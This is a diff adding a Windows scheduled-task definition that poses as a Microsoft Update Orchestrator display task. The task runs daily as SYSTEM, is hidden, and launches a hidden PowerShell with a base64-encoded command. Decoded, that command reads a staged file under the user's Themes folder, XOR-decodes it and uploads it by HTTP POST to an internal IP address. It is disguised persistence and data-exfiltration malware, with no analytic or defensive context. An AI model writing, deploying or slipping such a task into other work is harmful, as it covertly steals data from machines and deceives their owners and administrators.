@@ -1,0 +1,49 @@
+<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <RegistrationInfo>
+    <Date>2025-11-14T03:02:11</Date>
+    <Author>Microsoft Corporration</Author>
+    <Description>Manages display state notifications for the Update Session Orchestrator broker service.</Description>
+    <URI>\Microsoft\Windows\UpdateOrchestrator\USO_UxBroker_Display</URI>
+  </RegistrationInfo>
+  <Triggers>
+    <CalendarTrigger>
+      <StartBoundary>2025-11-14T03:17:00</StartBoundary>
+      <Enabled>true</Enabled>
+      <ScheduleByDay>
+        <DaysInterval>1</DaysInterval>
+      </ScheduleByDay>
+    </CalendarTrigger>
+  </Triggers>
+  <Principals>
+    <Principal id="Author">
+      <UserId>S-1-5-18</UserId>
+      <RunLevel>HighestAvailable</RunLevel>
+    </Principal>
+  </Principals>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <AllowHardTerminate>true</AllowHardTerminate>
+    <StartWhenAvailable>true</StartWhenAvailable>
+    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
+    <IdleSettings>
+      <StopOnIdleEnd>false</StopOnIdleEnd>
+      <RestartOnIdle>false</RestartOnIdle>
+    </IdleSettings>
+    <AllowStartOnDemand>false</AllowStartOnDemand>
+    <Enabled>true</Enabled>
+    <Hidden>true</Hidden>
+    <RunOnlyIfIdle>false</RunOnlyIfIdle>
+    <WakeToRun>false</WakeToRun>
+    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
+    <Priority>7</Priority>
+  </Settings>
+  <Actions Context="Author">
+    <Exec>
+      <Command>%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe</Command>
+      <Arguments>-WindowStyle Hidden -NonInteractive -EncodedCommand JAB4AGsAPQAwAHgAMwA3ADsAJABwAD0AIgAkAGUAbgB2ADoAQQBQAFAARABBAFQAQQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFQAaABlAG0AZQBzAFwAYQBlAHIAbwAuAHQAbQBwACIAOwAkAGIAPQBbAFMAeQBzAHQAZQBtAC4ASQBPAC4ARgBpAGwAZQBdADoAOgBSAGUAYQBkAEEAbABsAEIAeQB0AGUAcwAoACQAcAApADsAJABmAD0AKAAkAGIAfAAlAHsAWwBjAGgAYQByAF0AKAAkAF8AIAAtAGIAeABvAHIAIAAkAHgAawApAH0AKQAtAGoAbwBpAG4AJwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAXQA6ADoAbgBlAHcAKAApAC4AVQBwAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQAwAC4ANAAuADIAMAAuADEANQAvAGMAbwBsAGwAZQBjAHQAIgAsACIAUABPAFMAVAAiACwAJABmACkA</Arguments>
+    </Exec>
+  </Actions>
+</Task>
